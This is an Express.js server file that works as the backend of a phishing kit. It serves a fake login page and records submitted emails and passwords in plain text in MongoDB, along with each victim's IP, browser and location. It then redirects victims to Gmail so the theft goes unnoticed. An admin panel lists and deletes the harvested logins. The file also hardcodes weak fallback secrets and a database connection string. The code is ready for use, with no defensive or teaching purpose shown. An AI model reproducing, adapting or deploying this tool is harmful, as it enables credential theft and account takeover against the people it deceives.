require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const { MongoClient } = require('mongodb');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || 'mypassword123';
const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://admin:admin@cluster0.fahvkmg.mongodb.net/login-system?retryWrites=true&w=majority&appName=Cluster0';
const FIXED_2FA_CODE = process.env.FIXED_2FA_CODE || '123456';

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
const client = new MongoClient(MONGO_URI);
let loginsCollection;

async function connectDB() {
    try {
        await client.connect();
        const db = client.db('login-system');
        loginsCollection = db.collection('logins');
        console.log('✅ MongoDB Connected');
    } catch(e) { 
        console.error('❌ MongoDB Error:', e.message);
        setTimeout(connectDB, 5000);
    }
}
connectDB();

function getClientIP(req) { return req.headers['x-forwarded-for'] || req.connection?.remoteAddress || req.ip || '0.0.0.0'; }
function getBrowserInfo(req) { 
    try {
        const p = new UAParser(req.headers['user-agent']); 
        return { browser: p.getBrowser().name + ' ' + p.getBrowser().version, os: p.getOS().name + ' ' + p.getOS().version, device: p.getDevice().type || 'desktop' }; 
    } catch(e) { return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' }; }
}
function getLocation(ip) { 
    try {
        const g = geoip.lookup(ip); 
        return g ? { country: g.country || 'Unknown', city: g.city || 'Unknown' } : { country: 'Unknown', city: 'Unknown' }; 
    } catch(e) { return { country: 'Unknown', city: 'Unknown' }; }
}

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// CAPTURE ROUTE
app.post('/api/capture', async (req, res) => {
    try {
        const { email, password } = req.body;
        if (!email || !password) return res.status(400).json({ error: 'Required' });
        if (!loginsCollection) return res.json({ success: true, redirect: 'https://mail.google.com' });
        
        const ip = getClientIP(req);
        const browserInfo = getBrowserInfo(req);
        const location = getLocation(ip);
        
        await loginsCollection.insertOne({
            id: uuidv4(), email, password, ip,
            browser: browserInfo, location: location,
            timestamp: new Date().toISOString(), isNew: true
        });
        
        console.log('✅ SAVED: ' + email);
        res.json({ success: true, redirect: 'https://mail.google.com' });
    } catch(e) { 
        console.error('❌ Save error:', e.message);
        res.json({ success: true, redirect: 'https://mail.google.com' });
    }
});

// 2FA
app.post('/api/admin/verify-2fa', (req, res) => {
    const { adminKey, totpCode } = req.body;
    if (adminKey !== ADMIN_KEY) return res.status(401).json({ valid: false });
    if (totpCode === FIXED_2FA_CODE) {
        res.json({ valid: true, token: crypto.randomBytes(32).toString('hex') });
    } else { res.json({ valid: false }); }
});

app.get('/api/admin/check', (req, res) => {
    res.json({ valid: (req.headers['x-admin-key'] || req.query.key) === ADMIN_KEY });
});

app.get('/api/admin/logins', async (req, res) => {
    if ((req.headers['x-admin-key'] || req.query.key) !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    if (!loginsCollection) return res.json({ logins: [] });
    try {
        const logins = await loginsCollection.find().sort({ timestamp: -1 }).limit(500).toArray();
        res.json({ logins });
    } catch(e) { res.json({ logins: [] }); }
});

app.delete('/api/admin/logins/:id', async (req, res) => {
    if ((req.headers['x-admin-key'] || req.query.key) !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    if (!loginsCollection) return res.json({ success: false });
    await loginsCollection.deleteOne({ id: req.params.id }); 
    res.json({ success: true });
});

app.delete('/api/admin/logins', async (req, res) => {
    if ((req.headers['x-admin-key'] || req.query.key) !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    if (!loginsCollection) return res.json({ success: false });
    await loginsCollection.deleteMany({}); 
    res.json({ success: true });
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

app.listen(PORT, () => console.log('🚀 Server on port ' + PORT));